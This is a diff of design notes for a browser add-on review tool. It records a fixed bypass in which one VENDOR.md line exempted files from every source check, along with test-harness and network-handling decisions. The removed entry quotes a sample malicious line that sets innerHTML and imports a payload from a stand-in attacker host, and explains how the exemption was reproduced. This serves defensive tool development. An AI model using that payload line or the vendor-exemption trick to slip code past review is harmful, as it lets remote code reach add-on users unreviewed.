@@ -11,59 +11,111 @@ Assert what the consumer sees.
 
 ## Deferred
 
-- rethink downgrade mode, we can only downgrade if the XPI is including all trusted remote libs 1:1 - a rollup cannot work
-
-- **In SCA mode one VENDOR line exempts a file from EVERY source check.** Its own
-  commit; pre-existing (identical at `a02b74b`, `ddbd5c3` and HEAD), unrelated to the
-  vendor and lane work around it. Not a false-rejection bug - a review bypass.
-
-  Verified, SCA mode retained, the only difference a one-line `VENDOR.md` in the
-  SOURCE tree naming a package that does not exist:
-
-      lib/evil.js:  el.innerHTML = data;  import("https://evil.example.com/payload.js")
-
-      no VENDOR in source      -> unsafe-html, remote-resources (ERROR), icon info
-      one VENDOR line in source -> icon info
-
-  So it is not only a minified blob escaping `minified-code`, which is how this entry
-  first read. READABLE, actively malicious code escapes every source-level check,
-  including error-level ones, and nothing is fetched to earn it - the URL need only
-  parse as trusted and pinned.
-
-  Cause (`pipeline.js`, the SCA branch of Phase 3): `resolveVendor` runs on the source addon, `verifyVendor`
-  never does - SCA gets `verifyScaDependencies`, which reads package.json alone. A
-  trusted+pinned entry therefore produces NO `vendor.results` row, so
-  `applyUnverifiedVendor` has nothing to reconcile, while `isVendored` -> `nonAuthored`
-  keeps the file out of every scanner. Self-certifying by construction.
-
-  One subtlety when reproducing: the review must STAY in SCA mode. If the shipped XPI
-  is directly reviewable the pipeline downgrades to an XPI review (`sca-not-required`)
-  and the source tree's VENDOR file never applies - the first fixture I built missed
-  the bug that way.
-
-  Second, silent instance of the same class: an AMBIGUOUS source (one URL, two files)
-  keeps its paths in `vendor.set` while splicing the entry out of the manifest
-  (`resolve.js:277`), so no results row is ever written for them either. In XPI mode
-  `vendor-ambiguous-source` is an error and contains it; in SCA that check is
-  `sca: false`, so the files are exempt and never named.
-
-  An SCA is not supposed to carry a VENDOR file at all: `verify.js` says "the source
-  archive's package.json is the only dependency manifest (no VENDOR.md...)", while
-  `pipeline.js` describes the same call as "package.json deps + any VENDOR
-  declarations". One function, two modes, two comments, one of them wrong - and the
-  wrong one is what honours the file. Fix in that direction: in SCA mode a declaration
-  exempts nothing. Then there is nothing to verify because nothing is claimed, and the
-  offline vendor checks stay `sca: false` for a reason rather than by inheritance. The
-  developer-facing consequence is the right one: a library committed into a source
-  archive must be readable, which is what a source archive is for. Consider saying so
-  (an info) rather than ignoring the file silently.
-
-- **No golden covers a VERIFIED vendored file.** The golden harness injects a transport
-  that refuses everything (`OFFLINE_NET`), so `outcome: "verified"` is unreachable there
-  and the whole verified path - not just this lane - is unit-tested only. A
-  per-fixture `vendor-net.js` would cover it.
+- ~~**In SCA mode one VENDOR line exempts a file from EVERY source check.**~~ FIXED
+  (`9c86b0a`). The declaration half of `verifyVendor` was extracted as
+  `verifyVendorDeclarations` and now runs on the source addon too, so a declared path is
+  compared against the bytes its source serves and an entry that does not verify is
+  reconciled into the untrusted family - the file is reviewed as the developer's own code.
+  The eleven vendor and library checks lost their `sca: false`, so the reviewer is also
+  TOLD why. Fixture: `sca-vendor-declared`. The reproduction that opened this entry (a
+  one-line VENDOR.md removing an innerHTML finding and a remote-resource ERROR) now
+  reports both again.
 
 ## Decided - do not re-litigate
+
+- **The golden harness fakes the network at the socket, per fixture.** Every fetch goes
+  through `fetchWithTimeout` -> `globalThis.fetch`, so the harness replaces that one
+  function instead of injecting a transport per stage. An injected transport SKIPS the
+  production code above it - fetchWithTimeout, readBytes/readJson, the size caps - which
+  then has no golden coverage at all; faking the socket exercises all of it.
+
+  A fixture declares what a URL serves under `network` in its expected.json:
+  `{"sameAs": "<path>"}` serves the bytes of one of its own files (the way to express
+  "this declaration checks out" without a copy that rots), `{"body": "..."}` literal bytes
+  (the way to express "modified"), `{"json": ...}` a JSON endpoint (npm downloads, GitHub
+  stars, unpkg ?meta, the OSV audit), `{"status": 404}` an HTTP negative. An UNLISTED URL
+  404s - never throws - because a connection-shaped error sends fetchWithTimeout into
+  assertNetwork, which can abort the review (NetworkGoneError). A fixture wanting that
+  declares it. The mock is installed and restored per fixture, so one fixture's URLs never
+  answer another's.
+
+  This is what made the vendor system's success path reachable: `verified-vendor-source`
+  (bytes match, popular -> exempt, nothing reviews the file), `vendor-modified` (bytes
+  differ -> reject, that check's first golden), `not-popular-vendor-source` (bytes match,
+  under the download bar -> reject, which pins the "only popular libraries are trusted"
+  rule), and `vendored-remote-load` (a verified stylesheet whose own line loads a remote
+  font -> Extended manual review). Before it, every fixture could only ever reach
+  "unfetchable".
+
+  `vendor-vuln-unknown` and three more complete the set: a GitHub-sourced file that verifies (trusted,
+  pinned, bytes match, repo over the stars bar) and is therefore exempt - but an OSV audit
+  needs an npm NAME, and a GitHub URL carries none, so auditGithub tries to prove one by
+  hash-matching the bare repo name against that npm package. When that package does not
+  exist, no audit is possible and the check says so. Every outcome verifyUrl can return is
+  now covered by a golden, and so is every network-dependent check: `vendor-vulnerable`
+  and `vendor-vulnerable-dev` (an OSV advisory), `unpopular-source-dependency` (a declared
+  dep under the download bar) and `find-lib-on-cdn` (the jsDelivr content lookup, which a
+  fixture opts into with `"options": {"--cdn-lib-lookup": "true"}`).
+
+  Two things that cost a debugging round and are worth not repeating. The CDN identifier
+  WRITES its results back, so `fixtureCacheOpts` had to point `cdnLookupCache` at the
+  throwaway dir too - a fixture was polluting the repo's real `.lib-cdn-lookup-cache`, and
+  then passing from that cache, which hid a broken lookup. And `lookupHash` returns
+  `{state, hit}` where the caller only reads `state` for `"error"`: mutating the state to
+  "miss" does NOT discard the hit, so a mutation test has to attack `hit`.
+
+  Eight checks still never fire in any golden, all offline and unrelated to the network:
+  trademark-violation, manifest-invalid-json, manifest-missing, unsupported-dependency,
+  disguised-stylesheet, csp-unsafe-eval, csp-unsafe-inline,
+  minimize-web-accessible-resources.
+
+- **A dead network aborts the review; one dead load does not.** Every catch in the vendor
+  and CDN paths turns a fetch failure into a benign value ("not popular", "unfetchable",
+  no CDN match). That is right for one load failing and wrong for a dead route, where it
+  silently reclassifies a popular library as the developer's own code and the report reads
+  like a clean review of a different add-on. `assertNetwork` already tells the two apart
+  with a control-point probe, so each swallow site only has to not eat the answer
+  (`rethrowIfNetworkGone` in `src/util/net.js`).
+
+  A 404 or a timeout is NOT this - something answered, and the benign fallback stands.
+  `npmDownloads` keeps its null-vs-number distinction for the same reason, so
+  `unpopular-source-dependency` still never rejects on a flaky lookup. An INJECTED
+  transport says nothing about the real network either: the offline fixture harness throws
+  plain Errors, which stay swallowed, which is what all 79 goldens rest on.
+
+  The guard is at the entry points, not the catches: a test injects a NetworkGoneError and
+  asserts it propagates out of verifyVendor, verifyVendorDeclarations,
+  verifyScaDependencies, isPopular and resolveCdnLibraries. That is what catches a new
+  swallow site forgetting the rule.
+
+- **A bundled (rolled-up) build defeats library identification, and that is accepted.**
+  Every path that recognises third-party code is content-hash based - the Mozilla hash DB
+  (`missing-library`), the jsDelivr lookup (`find-lib-on-cdn`), the byte compare against a
+  declared source (`vendor-modified`). A bundler rewrites the bytes, so a rollup output
+  matches nothing, and `vendor-vulnerable` can only audit what it can NAME: declared
+  package.json deps (an XPI ships none) or hash-identified files (there are none).
+  Verified: a readable, unminified rollup with two inlined dependencies reports "did not
+  find any issues".
+
+  What is lost is the ADVISORY AUDIT, not the review - the whole bundle is read as the
+  developer's own code, which is the strictest treatment there is. Asking for the upstream
+  source does not help, because we cannot identify what was rolled up in the first place;
+  that is why declaration is not required here.
+
+  This is NOT a downgrade defect: it behaves identically for an XPI-only submission and a
+  downgraded one. The downgrade question itself is settled by the rule the plan set - could
+  this have been submitted XPI-only, and would we have rejected it? A readable rollup would
+  not have been, so no source archive is required. Transpiled source kinds are the one
+  deliberate exception (`resolveReviewMode`).
+
+- **Which to-do section a check's cases land in is a property of the CHECK**, declared as
+  `escalation: code-review | manual-review` beside its severity - never decided per case.
+  A check that would need both sections is asking two questions and is two checks:
+  `remote-resources` (what the developer ships) and `vendored-remote-resources` (what an
+  upstream release ships) are that split, sharing one scan via `ctx.addon.remoteRefs`. Do
+  not reintroduce a per-case flag to save an entry, and do not merge those two checks'
+  wording to save a key: one asks "is this even remote", the other "does the add-on need
+  this file at all".
 
 - **Only popular libraries are trusted; everything else is the developer's own work**
   and gets the full review every other file in the submission gets. That is the base
@@ -107,6 +159,19 @@ Assert what the consumer sees.
 
 An audit will find these and call them gaps. They were looked at and judged not
 worth the change. Re-raising one costs a round trip, so the reasoning is here.
+
+- **An AMBIGUOUS vendor source leaves its files unscanned, and that is fine.** One URL
+  declared for two files cannot verify either, so `resolveVendor` drops both entries from
+  the manifest while keeping their paths in the skip set (`resolve.js`: "still vendored,
+  just unverifiable"). Those files are therefore exempt from content review - verified:
+  two files each doing `innerHTML`, one also importing a remote payload, produce neither
+  finding, in an XPI review as much as an SCA one.
+
+  It is NOT a bypass, because `vendor-ambiguous-source` is an ERROR: the submission is
+  rejected in both modes, the developer must give each file its own source, and on the
+  next submission both files are verified and scanned normally. An unscanned file can
+  never be part of an ACCEPTED submission, which is the only thing that would matter. Do
+  not "fix" the skip set here.
 
 - **The CLI exit code is unpinned between 0 and 1.** `cli.js` ends
   `return hasErrors(result.findings) ? 1 : 0`, and mutating it to a constant `0`
